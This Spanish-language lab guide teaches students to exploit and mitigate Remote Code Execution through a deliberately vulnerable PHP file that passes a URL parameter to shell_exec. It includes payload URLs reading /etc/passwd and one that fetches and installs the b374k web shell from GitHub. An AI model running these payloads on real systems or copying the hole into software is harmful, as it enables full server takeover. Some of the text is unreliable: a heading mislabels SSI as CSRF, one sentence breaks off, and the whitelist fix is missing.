# PPS-Unidad3Actividad7-RCE
Explotación y Mitigación de Remote Code Execution (RCE).
Tenemos como objetivo:

> - Ver cómo se pueden hacer ataques Remote Code Execution (RCE).
>
> - Analizar el código de la aplicación que permite ataques de Remote Code Execution (RCE).
>
> - Implementar diferentes modificaciones del codigo para aplicar mitigaciones o soluciones.

## ¿Qué es CSRF?
---
Los servidores web generalmente brindan a los desarrolladores la capacidad de agregar pequeñas piezas de código dinámico dentro de páginas HTML estáticas, sin tener que lidiar con lenguajes completos del lado del servidor o del lado del cliente. Esta característica es proporcionada por El lado del servidor incluye(SSI).

Server-Side Includes son directivas que el servidor web analiza antes de servir la página al usuario. Representan una alternativa a escribir programas CGI o incrustar código utilizando lenguajes de scripting del lado del servidor, cuando solo se necesitan realizar tareas muy simples. Las implementaciones comunes de SSI proporcionan directivas (comandos) para incluir archivos externos, para establecer e imprimir variables de entorno CGI del servidor web, o para ejecutar scripts CGI externos o comandos del sistema.

SSI puede conducir a una Ejecución de Comando Remoto (RCE), sin embargo, la mayoría de los servidores web tienen el exec directiva desactivada por defecto.

Esta es una vulnerabilidad muy similar a una vulnerabilidad de inyección de lenguaje de scripting clásico. Una mitigación es que el servidor web debe configurarse para permitir SSI. Por otro lado, las vulnerabilidades de inyección SSI son a menudo más fáciles de explotar, ya que las directivas SSI son fáciles de entender y, al mismo tiempo, bastante potentes, por ejemplo, pueden generar el contenido de los archivos y ejecutar comandos del sistema.


Consecuencias de RCE:
• Acceso a información sensible (usuarios, archivos, configuración).
• Ejecución de comandos maliciosos (descarga y ejecución de malware).
• Escalada de privilegios y control total del sistema.

## ACTIVIDADES A REALIZAR
---
> Lee el siguiente [documento sobre Explotación y Mitigación de ataques de Remote Code Execution](./files/ExplotacionYMitigacionRCE.pdf>
> 
> También y como marco de referencia, tienes [ la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.]<> También y como marco de referencia, tienes [ la sección de correspondiente de ataque XSS reglejado de la **Proyecto Web Security Testing Guide** (WSTG) del proyecto **OWASP**.]<https://owasp.org/www-project-web-security-testing-guide/stable/4-Web_Application_Security_Testing/07-Input_Validation_Testing/08-Testing_for_SSI_Injection>
>

Vamos realizando operaciones:

## Código vulnerable
---
Archivo vulnerable: rce.php

~~~
<?php
	$output = shell_exec($_GET['cmd']);
	echo $output;
?>
~~~

El código permite que el usuario pueda enviar un comando en la URL (a través del parámetro cmd) y ejecutarlo directamente en el sistema y NO hay validación NI sanitización de la entrada. Por lo tanto se pueden ejecutar coman

## Explotación de RCE
---
Acceder a la URL y ejecutar un comando básico:
~~~
http://localhost/rce.php?cmd=id
~~~
![](images/rce1.png)

Si se muestra información del sistema o similar (uid=1000(user) gid=1000(user)), la aplicación es vulnerable.

**Intentar listar archivos del servidor:**
~~~
http://localhost/rce.php?cmd=ls
~~~

![](images/rce2.png)

Si se muestran archivos del sistema en pantalla, el ataque funciona.

**Probar más comandos:**

~~~
http://localhost/rce.php?cmd=cat /etc/passwd
~~~

![](images/rce3.png)

Si muestra el contenido de /etc/passwd, el atacante puede extraer credenciales.

**Intentar descargar y ejecutar malware:**

Sólo para nuestro ejemplo dar permisos de escritura a /var/www/html/

~~~
sudo chmod -R 777 /var/www/html/
~~~
Accedemos a la página web: 
~~~
http://localhost/rce.php?cmd=git clone https://github.com/b374k/b374k.git /var/www/html/b374k
~~~

El shell se habrá instalado y podremos acceder a él y ejecutar los comandos que queramos.

~~~
http://localhost/b374k/index.php
~~~
![](images/rce4.png)

El atacante tiene control total del sistema.

### Mitigaciones de RCE
**Eliminar el uso de shell_exec()**
---
Si la ejecución de comandos no es necesaria, deshabilitar la funcionalidad completamente.

Código seguro (rce.php sin posibilidad de ejecución de comandos ya que se elimina totalmente)

~~
<?php
die("Esta funcionalidad ha sido deshabilitada por razones de seguridad.");
?>
~~~
**Beneficios:**

- Bloquea cualquier intento de ejecución de código en el sistema.

- Evita ataques RCE de forma definitiva.

- No necesita más medidas de seguridad, ya que la ejecución de comandos es eliminada.

**Restringir Comandos Permitidos**

Si se necesita permitir algunos comandos específicos, usar una lista blanca (whitelist).

Código seguro (rce.php con lista blanca de comandos permitidos)

![](images/rce1.png)
![](images/rce1.png)

## ENTREGA

>__Realiza las operaciones indicadas__

>__Crea un repositorio  con nombre PPS-Unidad3Actividad7-Tu-Nombre donde documentes la realización de ellos.__

> No te olvides de documentarlo convenientemente con explicaciones, capturas de pantalla, etc.

>__Sube a la plataforma, tanto el repositorio comprimido como la dirección https a tu repositorio de Github.__

